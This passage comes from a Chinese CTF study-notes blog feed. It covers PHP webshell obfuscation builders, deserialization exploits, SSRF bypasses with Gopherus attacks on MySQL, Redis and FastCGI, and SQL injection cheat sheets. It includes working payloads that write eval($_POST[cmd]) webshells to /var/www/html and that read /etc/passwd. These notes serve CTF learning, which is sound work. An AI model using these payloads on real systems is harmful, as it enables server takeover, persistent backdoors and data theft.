class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"> </span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"> </span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"> </span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"> </span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></figure><h2 id="自增运算脚本"><a href="#自增运算脚本" class="headerlink" title="自增运算脚本"></a>自增运算脚本</h2><h3 id="如何使用-3"><a href="#如何使用-3" class="headerlink" title="如何使用"></a>如何使用</h3><p><strong>该方法在.0.12以上版本不可使用</strong><br><strong>构造出的语句为： assert($*POST[*]); 使用: *&#x3D;php函数 ; 例如* &#x3D;phpinfo();</strong></p><h3 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-反序列化</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="师傅们的教学"><a href="#师傅们的教学" class="headerlink" title="师傅们的教学"></a>师傅们的教学</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/solitudi/article/details/113588692</span><br><span class="line">https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/</span><br></pre></td></tr></table></figure><h1 id="写在开头可能用到的提醒"><a href="#写在开头可能用到的提醒" class="headerlink" title="写在开头可能用到的提醒"></a>写在开头可能用到的提醒</h1><ul><li><strong>序列化的字符串，如：O:11，可写成O:+11,类似于S:4也可</strong></li><li></li><li><strong>绕过__wakeup()，属性超过原定义属性个数</strong></li><li><strong>限定版本：PHP5-5.6.25 | PHP7-7.0.10</strong><br><img src="https://sirbei.com/wp-content/uploads/2022/09/3861849695.png" alt="绕过__wakeup"></li><li></li><li><strong>十六进制绕过，将序列化的字符串小写的s改为大写S,里面的字符串可用十六进制代替</strong></li><li><strong>例如 s:”name” 可改为 S:”n\97me”</strong></li><li></li><li><strong>字符串序列化还是字符串本身，例如：serialize(test)，那么输出还是test</strong></li><li><strong>当__serialize和__sleep方法同时存在，序列化时忽略__sleep方法而执行__serialize；当__unserialize方法和__wakeup方法同时存在，反序列化时忽略__wakeup方法而执行__unserialize。</strong></li></ul><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><ul><li><strong>__construct()，在对象被new的时候自动调用</strong></li><li><strong>__destruct()，当对象被销毁的时候会自动调用</strong></li><li><strong>__wakeup()，当执行反序列化的时候执行也就是unserialize()</strong></li><li><strong>__sleep()，当执行序列化的时候执行也就是serialize()</strong></li><li><strong>__invoke()，当对象被当成函数调用时触发，例如$a()</strong></li><li><strong>__call() 当从对象中调用不存在的方法时触发，例如a对象中没有b方法，触发</strong></li><li><strong>__get()，在对象中调用不存在的变量时候触发</strong></li><li><strong>__set()，在对象中写入不可写入的的属性时触发</strong></li><li><strong>__isset()，在不可访问的私有属性调用iset()或empty()时候触发</strong></li><li><strong>__unset，在不可访问的私有属性上使用unset()时触发</strong></li><li><strong>__tostring()，把类当成字符串来调用时候触发，或者把对象当成字符串去输出</strong></li><li><strong>__sleep()，当被serialize时候，如果有__sleep，会优先触发</strong><br><img src="https://sirbei.com/wp-content/uploads/2022/09/518359595.png" alt="属性"></li></ul><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="经典案例"><a href="#经典案例" class="headerlink" title="经典案例"></a>经典案例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"> </span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"> </span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"> </span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>方法： $user是反序列化后的类，所以$_cookie[‘user’]要传入序列化的类，根据代码，我们可以把ctfshowuser这个类中的$isvip的布尔值改为true，然后将这个class，放入本地，然后echo urlencode(serialize(new ctfshowuser()))，把这个输出值放入cookie。</strong></p></li><li><p><strong>思路: 因为$user是unserialize后的类，所以所以要把利用的类给序列化即可</strong></p></li><li><p><strong>序列化不会改变方法中的详细代码，只是可以改变调用什么之类的</strong></p><h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class message</span><br><span class="line">&#123;</span><br><span class="line">  public $from;</span><br><span class="line">  public $msg;</span><br><span class="line">  public $to;</span><br><span class="line">  public $token = &#x27;user&#x27;;</span><br><span class="line">  public function __construct($f, $m, $t)</span><br><span class="line">  &#123;</span><br><span class="line">      $this-&gt;from = $f;</span><br><span class="line">      $this-&gt;msg = $m;</span><br><span class="line">      $this-&gt;to = $t;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"> </span><br><span class="line">if (isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)) &#123;</span><br><span class="line">  $msg = new message($f, $m, $t);</span><br><span class="line">  $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">  setcookie(&#x27;msg&#x27;, base64_encode($umsg));</span><br><span class="line">  echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p><strong>详细原理： <a href="https://www.bilibili.com/video/BV1D64y1m78f?p=9&spm_id_from=pageDriver">https://www.bilibili.com/video/BV1D64y1m78f?p=9&amp;spm_id_from=pageDriver</a></strong></p></li><li><p><strong>目标：使public $token&#x3D;’admin’</strong></p></li><li><p><strong>方法：使用字符串逃逸，因为题目使用了str_replace来替换</strong></p></li><li><p><strong>过程：因为传入fuck会被替换为loveU,那么序列化的时候，s:4:”fuck”被替换后会变成s:4:”loveU”，这样就会不等相差了一个字符。然后在$f传入 fuck(若干个)”;s:3:”msg”;s:1:”b”;s:2:”to”;s:1:”c”;s:5:”token”;s:5:”admin”;},这个字符串是被替换后 的序列化字符串截取的，把user换成admin，然后一直添加fuck，然后一直查看序列化后的s:数量:”和这里面的字符串数量一不一样”，如果一样了，可以使用var_dump(unserialize(序列化后的字符串)) 看看是不是ok了</strong></p></li><li><p><strong>正常的序列化（未被过滤）: O:7:”message”:4:{s:4:”from”;s:4:”fuck”;s:3:”msg”;s:1:”b”;s:2:”to”;s:1:”c”;s:5:”token”;s:4:”user”;}</strong></p></li><li><p><strong>过滤后的: O:7:”message”:4:{s:4:”from”;s:4:”loveU”;s:3:”msg”;s:1:”b”;s:2:”to”;s:1:”c”;s:5:”token”;s:5:”admin”;}</strong></p></li><li><p><strong>例如字符串: 字符串逃逸，system被替换为了ctfshow，差异一个字符，后面用”;}闭合</strong></p><p><strong>O:8:”backdoor”:2:{s:1:”m”;s:168:”ctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshow”;s:1:”a”;s:6:”whoami”;}”;s:1:”a”;s:6:”whoami”;}</strong></p></li></ul><h2 id="指针改变变量"><a href="#指针改变变量" class="headerlink" title="指针改变变量"></a>指针改变变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"> </span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token=$t;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);</span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());</span><br><span class="line"> </span><br><span class="line">if($ctfshow-&gt;login())&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>解法： 本地试，复制关键代码，然后把$this-&gt;password &#x3D; $p 修改为$this-&gt;password &#x3D; &amp;$this-&gt;token，然后$msg&#x3D;serialize(new ctfshowAdmin(‘1’,’2’)) echo $msg; 输出即可</strong></li><li><strong>思路，代码要求类中的login方法，token和password全等于，把password的值赋值为，&amp;$this-&gt;password ，意思就是把password的地址给token，这样值就会相等</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-SSRF</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-SSRF/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="写在开头可能用到的提示"><a href="#写在开头可能用到的提示" class="headerlink" title="写在开头可能用到的提示"></a>写在开头可能用到的提示</h1><ul><li><strong>SSRF入口也可以尝试读文件，例如file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</strong></li><li><strong>127.0.0.1&#x2F;localhost可以用127.1 | 127.0.1 来表示，做题的还可能可以用<a href="http://0.0.0.0/">http://0</a> 来访问本地</strong></li><li><strong>如果过滤ip，可以尝试使用进制转换来绕过，例如: 127(10) -&gt; 0177(8) -&gt; 0x7f(16)</strong><br><code>127.0.0.1的各种进制</code><br>- 2130706433 10进制 <a href="http://127.0.0.1/">http://2130706433</a><br>- 017700000001 8进制 <a href="http://127.0.0.1/">http://017700000001</a><br>- 7F000001 16进制 <a href="http://127.0.0.1/">http://0x7F000001</a></li><li><strong>特殊符号字母在linux下也能表示数字和字母，例如ping ①②⑦.①，表示的是ping本地</strong><br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</li><li><strong><a href="http://ctf.@127.0.0.1/flag.php#.show">http://ctf.@127.0.0.1/flag.php#.show</a> 这里表示的还是解析127.0.0.1&#x2F;flag.php</strong></li></ul><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Gopherus-打本机端口"><a href="#Gopherus-打本机端口" class="headerlink" title="Gopherus(打本机端口)"></a>Gopherus(打本机端口)</h2><p><strong>GITHUB: <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></strong><br><strong>git clone下载命令: git clone <a href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></strong><br><strong>运行环境: python2</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>如果本机开启了80 3306 6379等端口，如果存在SSRF，那么可以本机访问gopher:&#x2F;&#x2F;127.0.0.1:3306，如果存在端口，访问会延迟一下</strong><br><strong>扫端口脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url= &quot;http://aa54a271-a145-4207-b6f6-ed9af4a8d0f0.challenges.ctfer.com:8080/&quot;</span><br><span class="line"> </span><br><span class="line">ports = [80,9000,8088]</span><br><span class="line"> </span><br><span class="line">address=[&#x27;10.0.1.188&#x27;]</span><br><span class="line"> </span><br><span class="line">for adr in address:</span><br><span class="line">    for p in ports:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;url&quot;:f&quot;gopher://&#123;adr&#125;:&#123;p&#125;/&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            response = requests.post(url=url,data=data,timeout=2)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(data) </span><br></pre></td></tr></table></figure><h3 id="3306端口攻击"><a href="#3306端口攻击" class="headerlink" title="3306端口攻击"></a>3306端口攻击</h3><ul><li><p>进入目录，不知道参数可以python gopherus.py -h</p></li><li><p>python gopherus.py –exploit mysql</p></li><li><p>输入数据库的用户名(root)和payload，payload可以用</p><p>select ‘<?php eval($_POST[cmd]);?>‘ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’;</p></li><li><p>生成的pyload就可以去注入传参，要注意生成的payload的_后面要urlencode(编码后有很多%25这些就是了)<br><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241212205919619.png" alt="image-20241212205919531"></p></li></ul><h3 id="6379端口-redis"><a href="#6379端口-redis" class="headerlink" title="6379端口 redis"></a>6379端口 redis</h3><ul><li>进入目录，不知道参数可以python gopherus.py -h</li><li>python gopherus.py –exploit redis</li><li><strong>输入PHPShell,然后输入网站默认目录，然后输入一句话木马,最后会生成shell.php在网站根目录</strong></li><li>生成的pyload就可以去注入传参，要注意生成的payload的_后面要urlencode(编码后有很多%25这些就是了)<br><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241212205915241.png" alt="image-20241212205915149"></li></ul><h3 id="9000端口-Fastcgi"><a href="#9000端口-Fastcgi" class="headerlink" title="9000端口 Fastcgi"></a>9000端口 Fastcgi</h3><ul><li><p>进入目录，不知道参数可以python gopherus.py -h</p></li><li><p>python gopherus.py –exploit fastcgi</p></li><li><p><strong>输入已经存在的文件，例如&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong></p></li><li><p><strong>然后输入要执行的系统命令，这里是写马，路径是写到&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php，POST传参cmd</strong></p><p>echo PD89ZXZhbCgkX1BPU1RbY21kXSk7Pz4&#x3D; |base64 -d &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</p></li><li><p>生成的pyload就可以去注入传参，要注意生成的payload的_后面要urlencode(编码后有很多%25这些就是了)<br><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241212205929317.png" alt="image-20241212205929234"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-SQL注入</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="开头可能会用到的提醒"><a href="#开头可能会用到的提醒" class="headerlink" title="开头可能会用到的提醒"></a>开头可能会用到的提醒</h1><ul><li><p><strong>如果空格被过滤，&#x2F;**&#x2F; &#96; %0b(tab) %09(tab) %0d(回车) %0a(换行) %0c(换页)</strong></p></li><li><p><strong>语句中 or 和 || 为同种意思</strong></p></li><li><p><strong>测试有几位可以用order by [几位] 来测试，如果没报错说明位数包含，如果报错说明位数不包含</strong></p></li><li><p><strong>union select被过滤可以使用union all select</strong></p></li><li><p><strong>where不能用，使用having</strong></p></li><li><p><strong>联合查询例子：select user,password from user where id&#x3D;1 union select user,password from user where id&#x3D;2</strong></p></li><li><p><strong>把一个查询到的数据给hex或者base64，union select id,hex&#x2F;to_base64(username),password from user where username&#x3D;’flag’</strong></p></li><li><p><strong>base64加解密：to_base64(“”)&#x2F;from_base64(“”)</strong></p></li><li><p><strong>写入文件，union select 1,”<?php phpinfo(); ?>“ into outfile ‘路径’</strong></p></li><li><p><strong>读取文件 union select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3</strong></p></li><li><p><strong>sql注入对后面的语句注释可以用%23 或 –+</strong></p></li><li><p><strong>延时注入，如果读取文件，可以用load_file(‘文件名’)</strong></p></li><li><p><strong>常见的闭合，’ “ ‘) “) ‘)) 空格</strong></p></li><li><p><strong>宽字节注入漏洞， %df、%81、%E6、�均可绕过.问题代码 mysql_query(“SET NAMES gbk”);</strong></p></li><li><p><strong>这几个字符串在md5加密后，放到hex十六进制中，生成的字符串带’，在部分场景可以闭合使用: ffifdyop | e58 | 4611686052576742364</strong></p></li><li><p><strong>如果筛选条件的双引号和单引号无法使用，可以变为Hex代替。</strong></p><p>例如: select id from user union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;”sibei”;<br>变为: select id from user union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7369626569;</p></li><li><p><strong>反引号绕过，例如information_schema.tables和information_schema `tables&#96;都可以使用</strong></p></li></ul><h1 id="写Shell的几种方式"><a href="#写Shell的几种方式" class="headerlink" title="写Shell的几种方式"></a>写Shell的几种方式</h1><p>1：union select 写入<br>select * from stu where id&#x3D;1 union select 1,2,’<?=phpinfo();?>‘ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’– -</p><ol><li>lines terminated by 写入（在行末尾写入）<br>select * from stu where id&#x3D;1 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’ lines terminated by ‘<?php phpinfo() ?>‘– -</li></ol><p>3.lines starting by 写入（在行头写入）<br>select * from stu where id&#x3D;1 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’ lines starting by ‘<?php phpinfo() ?>‘– -</p><p>4.fields terminated by 写入（在每个字段后写入）<br>select * from stu where id&#x3D;1 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’ fields terminated by ‘<?php phpinfo() ?>‘– -</p><p>5.columns terminated by 写入（在每个字段后写入）<br>select * from stu where id&#x3D;1 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’ columns terminated by ‘<?php phpinfo() ?>‘– -</p><h1 id="手工注入获取数据库等信息"><a href="#手工注入获取数据库等信息" class="headerlink" title="手工注入获取数据库等信息"></a>手工注入获取数据库等信息</h1><ul><li><p><strong>普通语句：schema_name——数据库名；table_name——表名；column_name——字段名</strong>；</p><h2 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h2></li><li><p><strong>查询所有数据库(一行返回)： select group_concat(schema_name) from information_schema.schemata</strong></p></li><li><p><strong>查询所有数据库：select schema_name from information_schema.schemata limit 0,1</strong><br>&#x2F;&#x2F;limit 0,1 表示从查询，限制一行</p></li><li><p><strong>查询当前使用的数据库: select database()#</strong></p><h2 id="查数据库中的表"><a href="#查数据库中的表" class="headerlink" title="查数据库中的表"></a>查数据库中的表</h2></li><li><p><strong>查询当前数据库所有的表：select table_name from information_schema.tables where table_schema&#x3D;’数据库名’ limit 0,1#</strong><br>&#x2F;&#x2F;limit 表示从第一个开始，一共返回一行</p></li><li><p><strong>查询当前数据库所有的表(一行返回): select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</strong></p></li><li><p><strong>查询指定数据库所有的表(一行返回): select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’</strong></p></li><li><p><strong>查询所有数据库所有的表(一行返回): select group_concat(table_name) from information_schema.tables</strong></p><h2 id="从表中查字段"><a href="#从表中查字段" class="headerlink" title="从表中查字段"></a>从表中查字段</h2></li><li><p><strong>查询所有字段名：select column_name from information_schema.columns where table_name&#x3D;’表名’ limit 0,1#</strong><br>&#x2F;&#x2F;limit 0,1 表示从从第一个开始查，一共返回一行</p></li><li><p><strong>从表查询所有字段(一行返回)： select group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’</strong></p><h2 id="从字段查询所有数据"><a href="#从字段查询所有数据" class="headerlink" title="从字段查询所有数据"></a>从字段查询所有数据</h2></li><li><p><strong>从字段查询所有数据(一行返回): select group_concat(字段1,字段2) from 表名</strong></p></li><li><p><strong>查询当前数据库字段内容：select * from 表名#</strong></p></li><li><p><strong>查询指定数据库的表: select group_concat(字段名) from 数据库.表名</strong></p></li></ul><h1 id="时间盲注专题"><a href="#时间盲注专题" class="headerlink" title="时间盲注专题"></a>时间盲注专题</h1><ul><li><strong>原理: 可以执行sql语句，但是没有回显。那么可以用sql中的substr来检测有没有想要的字符，从而达到爆库</strong></li><li><strong>语句拆分详细if(substr((放入sql查询语句),从哪开始找,一共找几位)&#x3D;’substr结果是什么字符’,成功执行这个,失败执行这个)</strong></li></ul><h2 id="各种盲注查询"><a href="#各种盲注查询" class="headerlink" title="各种盲注查询"></a>各种盲注查询</h2><h3 id="找到当前的在用的数据库"><a href="#找到当前的在用的数据库" class="headerlink" title="找到当前的在用的数据库"></a>找到当前的在用的数据库</h3><p><strong>select if(substr((select database()),1,1)&#x3D;’s’,sleep(3),1);</strong></p><h3 id="找所有的表"><a href="#找所有的表" class="headerlink" title="找所有的表"></a>找所有的表</h3><p><strong>select if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),需要找的下标,1)&#x3D;’需要找的字符’,sleep(2),1)</strong></p><h3 id="找到表中所有的字段名称"><a href="#找到表中所有的字段名称" class="headerlink" title="找到表中所有的字段名称"></a>找到表中所有的字段名称</h3><p><strong>select if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;’你想看的表名’ and table_schema&#x3D;database()),需要找的下标,1)&#x3D;’你想找的字符’,sleep(3),1)</strong></p><h3 id="从字段中找到想要的数据"><a href="#从字段中找到想要的数据" class="headerlink" 